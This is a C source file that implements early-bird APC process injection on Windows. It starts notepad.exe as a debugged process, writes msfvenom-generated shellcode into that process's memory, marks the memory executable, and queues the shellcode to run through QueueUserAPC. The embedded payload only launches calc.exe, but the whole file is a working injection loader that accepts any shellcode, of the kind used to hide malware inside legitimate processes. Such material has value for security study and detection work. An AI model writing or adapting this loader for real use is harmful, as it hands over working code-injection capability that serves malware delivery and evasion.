#include <Windows.h>
#include "misc.h"


int main()
{
	// msfvenom -p windows/x64/exec CMD="calc.exe" -f c
	BYTE pbPayload[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	SIZE_T sPayload = (sizeof(pbPayload) / sizeof(BYTE)) - 1;

	BOOL bRet = FALSE;

	WCHAR lpCommandLine[] = L"C:\\Windows\\system32\\notepad.exe";

	STARTUPINFO siProcess = { 0 };
	siProcess.cb = sizeof(siProcess);

	PROCESS_INFORMATION piProcess = { 0 };

	LPVOID pbPayloadEx = NULL;

	DWORD dwOldProtection = 0;
	DWORD dwRet = -1;
	
	do {
		wprintf(L"[i] Create process under DEBUG... ");
		bRet = CreateProcessW(
			NULL,
			lpCommandLine,
			NULL,
			NULL,
			FALSE,
			DEBUG_ONLY_THIS_PROCESS,
			NULL,
			NULL,
			&siProcess,
			&piProcess
		);
		if (!bRet)
		{
			printError(L"CreateProcessW");
			break;
		}
		wprintf(L"processID: %d\n", piProcess.dwProcessId);

		wprintf(L"[i] Allocating external memory for payload... ");
		pbPayloadEx = VirtualAllocEx(piProcess.hProcess, NULL, sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pbPayloadEx == NULL)
		{
			printError(L"VirtualAllocEx");
			break;
		}
		wprintf(L"0x%p\n", pbPayload);

		wprintf(L"\t[i] Copying payload... ");
		bRet = WriteProcessMemory(piProcess.hProcess, pbPayloadEx, pbPayload, sPayload, NULL);
		if (!bRet)
		{
			printError(L"WriteProcessMemory");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Adding EXECUTE flag for allocated memory... ");
		DWORD dwOldProtection = NULL;

		bRet = VirtualProtectEx(piProcess.hProcess, pbPayloadEx, sPayload, PAGE_EXECUTE_READWRITE, &dwOldProtection);
		if (!bRet)
		{
			printError(L"VirtualProtect");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Adding new function to Asynchronous Procedure Calls... ");
		dwRet = QueueUserAPC((PAPCFUNC)pbPayloadEx, piProcess.hThread, NULL);
		if (dwRet == 0)
		{
			printError(L"QueueUserAPC");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Stop process \"debugging\"... ");
		bRet = DebugActiveProcessStop(piProcess.dwProcessId);
		if (!bRet)
		{
			printError(L"DebugActiveProcessStop");
			break;
		}
		wprintf(L"done\n");

		//WaitForSingleObject(piProcess.hProcess, INFINITE);

		CloseHandle(piProcess.hProcess);
		CloseHandle(piProcess.hThread);

		return 0;

	} while (FALSE);

	return -1;
}
